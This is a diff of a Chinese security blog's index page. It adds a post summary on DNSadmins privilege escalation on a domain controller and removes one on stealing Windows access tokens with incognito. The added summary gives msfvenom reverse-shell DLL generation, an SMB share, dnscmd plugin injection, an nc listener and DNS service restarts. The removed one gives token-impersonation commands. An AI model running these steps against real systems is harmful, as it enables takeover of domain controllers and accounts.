@@ -118,6 +118,32 @@
 <!--  <div class="project-card">
   
   <div class="ctnWrap">
+    <a href="/2020/04/30/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BDNSadmins/" class="title">域控提权之DNSadmins</a>
+    <section class="desc">
+  默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限
+利用条件：
+拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS服务器对象的写特权
+whoami /groups  查看用户组
+
+制作dll：
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.67 LPORT=4444 --platform=windows -f dll &gt; plugin.dll开启smb共享：（可通过net use \10.10.14.67\tw 检测是否能连通smbserver  ， 关于smbserver不能连接，排除网络问题之后，可能是共享占用问题，更改共享名称重新开启smbserver即可）
+sudo impacket-smbserver tw .注入dll
+dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \\10.10.14.67\tw\plugin.dll监听：
+nc -lvvp 444重启dns致使paylload生效：
+sc.exe stop dns
+sc.exe start dns或
+sc.exe \\10.10.10.169 stop dns
+sc.exe \\10.10.10.169 start dns  
+
+
+</section>
+    <p class="sub">Apr 30, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
     <a href="/2020/04/26/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" class="title">XXE漏洞详解</a>
     <section class="desc">
   0x01、XXE原理：XXE：XML External Entity Injection；即XML外部实体注入（php版本大于5.4.45的默认不解析外部实体）
@@ -605,55 +631,6 @@ void main()
   </div>
 </div>-->
 <!---->
-<!--  <div class="project-card">
-  
-  <div class="ctnWrap">
-    <a href="/2020/04/26/incognito-Stealing-Windows-Access-Tokens/" class="title">incognito Stealing Windows Access Tokens</a>
-    <section class="desc">
-  使用incognito可以窃取令牌以任意用户身份执行任意命令或payload
-得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌列出域管理组成员：
-net groups &quot;Domain Admins&quot; /domain0x01、ACCESS TOKEN(访问令牌)：
-当用户登录时，Windows会为此用户创建访问令牌，用于存储用户的身份和特权
-Token在用户创建进程或者线程时会被使用，那么这些进程或者线程能够访问哪些资源取决于当前令牌
-0x02、令牌类型
-Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)
-Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)
-这两种令牌,都会在系统重启以后被清除, 否则将会一直驻留在内存中,而授权令牌则会在用户注销以后自动被转为模拟令牌,但仍然可利用。
-0x03、本地和远程的基本用法
-本地： 
-查看 token：
-incognito.exe list_tokens–u 
-获取到已注销用户 int18\administrator的token,盗取token 执行命令： 
-incognito.exe execute -c &quot;int18\administrator&quot; calc.exe 远程：
-incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  list_tokens -u
-incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe 
-0x04、提权、降权、伪造（以本地示例)
-incognito execute -c &quot;NT AUTHORITYSYSTEM&quot; cmd.exe #提权至system 
-incognito execute -c &quot;int\test&quot; cmd.exe #降权至当前 test 用户 
-incognito execute -c &quot;int\test1&quot; cmd.exe #伪造test1 用户 0x03、获取TrustedInstaller 权限（修改系统文件）管理员、System 均无法修改系统文件、需 TrustedInstaller 权限借用 TrustedInstaller.exe 的 token 创建子进程，这样子进程就有了 TrustedInstaller 权限
-在CS下获取TrustedInstaller 
-
-shell sc strat TrustedInstaller 
-
-
-steal token  1700 ##ps查看TrustedInstaller进程号
-
-
-shell whoami /groups
-
-链接：
-https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/
-https://blog.csdn.net/qq_36374896/article/details/84261516  
-https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html 
-https://www.jianshu.com/p/907c6aab6fd0
-http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf
-
-
-</section>
-    <p class="sub">Apr 26, 2020</p>
-  </div>
-</div>-->
-<!---->
 <!--
   <nav class="pagination">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">&lt;span class&#x3D;&quot;iconfont icon-arrow-right&quot;&gt;&lt;&#x2F;span&gt;</a>
@@ -667,6 +644,47 @@ http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title="域控提权之DNSadmins" alt="域控提权之DNSadmins" href="/2020/04/30/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BDNSadmins/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="域控提权之DNSadmins" alt="域控提权之DNSadmins"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; 域控提权之DNSadmins &gt;</div>
+                            <div class="content flex1">
+                                
+  默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限
+利用条件：
+拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS服务器对象的写特权
+whoami /groups  查看用户组
+
+制作dll：
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.67 LPORT=4444 --platform=windows -f dll &gt; plugin.dll开启smb共享：（可通过net use \10.10.14.67\tw 检测是否能连通smbserver  ， 关于smbserver不能连接，排除网络问题之后，可能是共享占用问题，更改共享名称重新开启smbserver即可）
+sudo impacket-smbserver tw .注入dll
+dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \\10.10.14.67\tw\plugin.dll监听：
+nc -lvvp 444重启dns致使paylload生效：
+sc.exe stop dns
+sc.exe start dns或
+sc.exe \\10.10.10.169 stop dns
+sc.exe \\10.10.10.169 start dns  
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 30, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="XXE漏洞详解" alt="XXE漏洞详解" href="/2020/04/26/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"
                        class="post-item swiper-slide flex flex-v">
@@ -1278,70 +1296,6 @@ void main()
 
 .fscanf判定shellcode分割符需要进行转义(这点是乔哥解决的，我乔哥还是强啊)
 
-
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="incognito Stealing Windows Access Tokens" alt="incognito Stealing Windows Access Tokens" href="/2020/04/26/incognito-Stealing-Windows-Access-Tokens/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="incognito Stealing Windows Access Tokens" alt="incognito Stealing Windows Access Tokens"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; incognito Stealing Windows Access Tokens &gt;</div>
-                            <div class="content flex1">
-                                
-  使用incognito可以窃取令牌以任意用户身份执行任意命令或payload
-得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌列出域管理组成员：
-net groups &quot;Domain Admins&quot; /domain0x01、ACCESS TOKEN(访问令牌)：
-当用户登录时，Windows会为此用户创建访问令牌，用于存储用户的身份和特权
-Token在用户创建进程或者线程时会被使用，那么这些进程或者线程能够访问哪些资源取决于当前令牌
-0x02、令牌类型
-Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)
-Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)
-这两种令牌,都会在系统重启以后被清除, 否则将会一直驻留在内存中,而授权令牌则会在用户注销以后自动被转为模拟令牌,但仍然可利用。
-0x03、本地和远程的基本用法
-本地： 
-查看 token：
-incognito.exe list_tokens–u 
-获取到已注销用户 int18\administrator的token,盗取token 执行命令： 
-incognito.exe execute -c &quot;int18\administrator&quot; calc.exe 远程：
-incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  list_tokens -u
-incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe 
-0x04、提权、降权、伪造（以本地示例)
-incognito execute -c &quot;NT AUTHORITYSYSTEM&quot; cmd.exe #提权至system 
-incognito execute -c &quot;int\test&quot; cmd.exe #降权至当前 test 用户 
-incognito execute -c &quot;int\test1&quot; cmd.exe #伪造test1 用户 0x03、获取TrustedInstaller 权限（修改系统文件）管理员、System 均无法修改系统文件、需 TrustedInstaller 权限借用 TrustedInstaller.exe 的 token 创建子进程，这样子进程就有了 TrustedInstaller 权限
-在CS下获取TrustedInstaller 
-
-shell sc strat TrustedInstaller 
-
-
-steal token  1700 ##ps查看TrustedInstaller进程号
-
-
-shell whoami /groups
-
-链接：
-https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/
-https://blog.csdn.net/qq_36374896/article/details/84261516  
-https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html 
-https://www.jianshu.com/p/907c6aab6fd0
-http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf
 
 
 
